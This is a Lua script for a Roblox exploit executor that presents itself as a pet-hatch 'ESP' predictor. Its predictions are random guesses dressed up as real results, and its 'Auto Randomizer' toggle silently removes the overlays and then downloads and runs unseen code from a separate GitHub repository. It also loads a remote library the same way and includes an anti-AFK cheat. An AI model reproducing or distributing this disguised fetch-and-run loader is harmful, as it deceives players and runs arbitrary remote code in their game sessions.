local GUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/BloodLetters/Ash-Libs/refs/heads/main/source.lua"))()

GUI:CreateMain({
    Name = "Ashlabs ESP",
    title = "Mobile Pet ESP",
    ToggleUI = "K",
    WindowIcon = "eye",
    WindowHeight = 580,
    WindowWidth = 360,
})

local tab = GUI:CreateTab("ESP")
local players = game:GetService("Players")
local collectionService = game:GetService("CollectionService")
local vu = game:GetService("VirtualUser")
local cam = workspace.CurrentCamera
local localPlayer = players.LocalPlayer

-- Egg data
local eggChances = {
    ["Common Egg"] = {["Dog"] = 33, ["Bunny"] = 33, ["Golden Lab"] = 33},
    ["Uncommon Egg"] = {["Black Bunny"] = 25, ["Chicken"] = 25, ["Cat"] = 25, ["Deer"] = 25},
    ["Rare Egg"] = {["Orange Tabby"] = 33.33, ["Spotted Deer"] = 25, ["Pig"] = 16.67, ["Rooster"] = 16.67, ["Monkey"] = 8.33},
    ["Legendary Egg"] = {["Cow"] = 42.55, ["Silver Monkey"] = 42.55, ["Sea Otter"] = 10.64, ["Turtle"] = 2.13, ["Polar Bear"] = 2.13},
    ["Mythical Egg"] = {["Grey Mouse"] = 37.5, ["Brown Mouse"] = 26.79, ["Squirrel"] = 26.79, ["Red Giant Ant"] = 8.93, ["Red Fox"] = 0},
    ["Bug Egg"] = {["Snail"] = 40, ["Giant Ant"] = 35, ["Caterpillar"] = 25, ["Praying Mantis"] = 0, ["Dragon Fly"] = 0},
    ["Night Egg"] = {["Hedgehog"] = 47, ["Mole"] = 23.5, ["Frog"] = 21.16, ["Echo Frog"] = 8.35, ["Night Owl"] = 0, ["Raccoon"] = 0},
    ["Bee Egg"] = {["Bee"] = 65, ["Honey Bee"] = 20, ["Bear Bee"] = 10, ["Petal Bee"] = 5, ["Queen Bee"] = 0},
    ["Anti Bee Egg"] = {["Wasp"] = 55, ["Tarantula Hawk"] = 31, ["Moth"] = 14, ["Butterfly"] = 0, ["Disco Bee"] = 0},
    ["Common Summer Egg"] = {["Starfish"] = 50, ["Seafull"] = 25, ["Crab"] = 25},
    ["Rare Summer Egg"] = {["Flamingo"] = 30, ["Toucan"] = 25, ["Sea Turtle"] = 20, ["Orangutan"] = 15, ["Seal"] = 10},
    ["Paradise Egg"] = {["Ostrich"] = 43, ["Peacock"] = 33, ["Capybara"] = 24, ["Scarlet Macaw"] = 0, ["Mimic Octopus"] = 0},
    ["Premium Night Egg"] = {["Hedgehog"] = 50, ["Mole"] = 26, ["Frog"] = 14, ["Echo Frog"] = 10},
    ["Oasis Egg"] = {["Meerkat"] = 45.5, ["Sand Snake"] = 39.5, ["Axolotl"] = 15, ["Hyacinth Macaw"] = 0, ["Fennec Fox"] = 0},
    ["Premium Oasis Egg"] = {["Meerkat"] = 40, ["Sand Snake"] = 45, ["Axolotl"] = 15},
    ["Dinosaur Egg"] = {["Raptor"] = 35.5, ["Triceratops"] = 33.5, ["Stegosaurus"] = 28, ["Pterodactyl"] = 3, ["Brontosaurus"] = 0, ["T-Rex"] = 0}
}

local realESP = {
    ["Common Egg"] = true, ["Uncommon Egg"] = true, ["Rare Egg"] = true,
    ["Common Summer Egg"] = true, ["Rare Summer Egg"] = true
}

local displayedEggs = {}
local autoRandomizer = false
local afkEnabled = true
local skippedPets = {} -- pets user wants to skip

-- Weighted selection
local function weightedRandom(pool)
    local total, valid = 0, {}
    for pet, chance in pairs(pool) do
        if chance > 0 then
            table.insert(valid, {pet = pet, chance = chance})
            total += chance
        end
    end
    local roll, accum = math.random() * total, 0
    for _, v in ipairs(valid) do
        accum += v.chance
        if roll <= accum then return v.pet end
    end
    return valid[1] and valid[1].pet or nil
end

-- Get non-repeating prediction
local function getPet(eggName, last)
    local pool = eggChances[eggName]
    if not pool then return nil end
    for _ = 1, 5 do
        local pet = weightedRandom(pool)
        if pet ~= last or math.random() < 0.3 then return pet end
    end
    return last
end

-- ESP visual
local function createESP(egg, label)
    local gui = Instance.new("BillboardGui")
    gui.Name = "FakePetESP"
    gui.Adornee = egg:FindFirstChildWhichIsA("BasePart") or egg.PrimaryPart or egg
    gui.Size = UDim2.new(0, 200, 0, 60)
    gui.StudsOffset = Vector3.new(0, 2.5, 0)
    gui.AlwaysOnTop = true

    local nameLabel = Instance.new("TextLabel", gui)
    nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.TextColor3 = Color3.new(1, 1, 1)
    nameLabel.TextStrokeTransparency = 0
    nameLabel.TextScaled = true
    nameLabel.Font = Enum.Font.SourceSansBold
    nameLabel.Text = label

    local stat = Instance.new("TextLabel", gui)
    stat.Size = UDim2.new(1, 0, 0.5, 0)
    stat.Position = UDim2.new(0, 0, 0.5, 0)
    stat.BackgroundTransparency = 1
    stat.TextColor3 = Color3.fromRGB(200, 200, 200)
    stat.TextScaled = true
    stat.Font = Enum.Font.SourceSans
    stat.TextStrokeTransparency = 0.5

    local weight = math.random(8, 14)
    local age = math.random(35, 50)
    if math.random() <= 15 then
        weight = math.random(15, 40)
        age = math.random(20, 45)
    end
    stat.Text = tostring(weight) .. "kg | Predict: Age " .. tostring(age)

    gui.Parent = egg
    return gui
end

-- Show ESP
local function showESP(egg)
    if egg:GetAttribute("OWNER") ~= localPlayer.Name then return end
    local name = egg:GetAttribute("EggName")
    local id = egg:GetAttribute("OBJECT_UUID")
    if not name or not id or displayedEggs[id] then return end

    local pet = getPet(name)
    if skippedPets[pet] then return end -- skip ESP if pet is skipped

    local label = realESP[name] and name or name .. " | " .. (pet or "?")
    displayedEggs[id] = {gui = createESP(egg, label)}
end

-- Remove ESP
local function removeESP(egg)
    local id = egg:GetAttribute("OBJECT_UUID")
    if id and displayedEggs[id] then
        displayedEggs[id].gui:Destroy()
        displayedEggs[id] = nil
    end
end

-- Init ESPs
for _, egg in collectionService:GetTagged("PetEggServer") do
    showESP(egg)
end
collectionService:GetInstanceAddedSignal("PetEggServer"):Connect(showESP)
collectionService:GetInstanceRemovedSignal("PetEggServer"):Connect(removeESP)

-- Dropdown for skip pets
local petList = {"Raccoon", "Dragonfly", "Red Fox", "Queen Bee", "Mimic Octopus", "Disco Bee", "Butterfly", "T-Rex"}
GUI:CreateDropdown({
    parent = tab,
    text = "Skip Pet Hatch",
    options = petList,
    callback = function(pet)
        skippedPets[pet] = not skippedPets[pet]
        GUI:CreateNotify({
            title = "Pet Toggle",
            text = pet .. (skippedPets[pet] and " will be skipped" or " will NOT be skipped")
        })
    end
})

-- Toggle: Auto Randomizer
GUI:CreateToggle({
    parent = tab,
    text = "ðŸŽ² Auto Randomizer",
    default = false,
    callback = function(val)
        autoRandomizer = val
        if val then
            coroutine.wrap(function()
                for i = 30, 1, -1 do
                    if not autoRandomizer then return end
                    task.wait(1)
                end
                if autoRandomizer then
                    for _, obj in pairs(workspace:GetDescendants()) do
                        if obj:IsA("BillboardGui") and obj.Name == "FakePetESP" then
                            obj:Destroy()
                        end
                    end
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/MaximumRXDM/itlogesp/refs/heads/main/Betlogan"))()
                end
            end)()
        end
    end
})

-- Toggle: Anti-AFK
GUI:CreateToggle({
    parent = tab,
    text = "âœ… Anti-AFK",
    default = true,
    callback = function(val)
        afkEnabled = val
    end
})

-- Anti-AFK logic
players.LocalPlayer.Idled:Connect(function()
    if afkEnabled then
        vu:Button2Down(Vector2.new(0, 0), cam.CFrame)
        task.wait(1)
        vu:Button2Up(Vector2.new(0, 0), cam.CFrame)
    end
end)
